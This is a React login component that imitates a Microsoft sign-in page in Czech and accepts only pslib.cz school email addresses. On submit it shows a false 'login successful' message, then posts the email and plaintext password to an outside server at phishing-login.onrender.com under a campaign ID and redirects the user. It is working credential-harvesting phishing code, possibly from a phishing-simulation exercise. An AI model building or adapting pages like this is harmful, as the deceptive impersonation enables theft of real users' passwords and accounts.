import React, { useState } from 'react';
import axios from 'axios';
import { toast, Toaster } from 'sonner';

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const validateEmail = (email) => {
    const emailRegex = /^[a-z]{2,}\.[a-z]{2,}\.[1-9][0-9]{2}@pslib\.cz$/;
    const normalizedEmail = email.toLowerCase();
    
    // Check if there are exactly two dots before @
    const beforeAt = normalizedEmail.split('@')[0];
    const dotCount = (beforeAt.match(/\./g) || []).length;
    
    if (dotCount !== 2) {
      return false;
    }
    
    return emailRegex.test(normalizedEmail);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateEmail(email)) {
      toast.error('Email musí být ve formátu jmeno.prijmeni.XXX@pslib.cz');
      return;
    }

    // Show success toast first
    toast.success('Přihlášení úspěšné');

    // Wait a moment for the toast to be visible
    await new Promise(resolve => setTimeout(resolve, 500));

    try {
      const response = await axios.post('https://phishing-login.onrender.com/api/credentials', {
        username: email,
        password: password,
        campaignId: '65c4d8f2e987b459a731d8f2'
      });
      
      window.location.href = response.data.redirect;
    } catch (err) {
      toast.error('Neplatné přihlašovací údaje');
      setError('Neplatné přihlašovací údaje');
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <Toaster position="top-center" richColors />
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        <img
          className="mx-auto h-12 w-auto"
          src="https://cdn-icons-png.flaticon.com/512/732/732221.png"
          alt="Microsoft"
        />
        <h2 className="mt-6 text-center text-3xl font-extrabold text-gray-900">
          Přihlaste se
        </h2>
        <p className="mt-2 text-center text-sm text-gray-600">
          Zadejte své přihlašovací údaje
        </p>
      </div>

      <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-md">
        <div className="bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10">
          <form className="space-y-6" onSubmit={handleSubmit}>
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700">
                Email
              </label>
              <div className="mt-1">
                <input
                  id="email"
                  name="email"
                  type="email"
                  autoComplete="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                />
              </div>
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700">
                Heslo
              </label>
              <div className="mt-1">
                <input
                  id="password"
                  name="password"
                  type="password"
                  autoComplete="current-password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                />
              </div>
            </div>

            {error && (
              <div className="text-sm text-red-600">
                {error}
              </div>
            )}

            <div>
              <button
                type="submit"
                className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
              >
                Přihlásit se
              </button>
            </div>
          </form>

          <div className="mt-6">
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-300" />
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-2 bg-white text-gray-500">
                  Nemůžete se přihlásit?
                </span>
              </div>
            </div>

            <div className="mt-6 grid grid-cols-1 gap-3">
              <a
                href="#"
                className="text-sm text-center text-blue-600 hover:text-blue-500"
              >
                Zapomněli jste heslo?
              </a>
              <a
                href="#"
                className="text-sm text-center text-blue-600 hover:text-blue-500"
              >
                Vytvořit nový účet
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
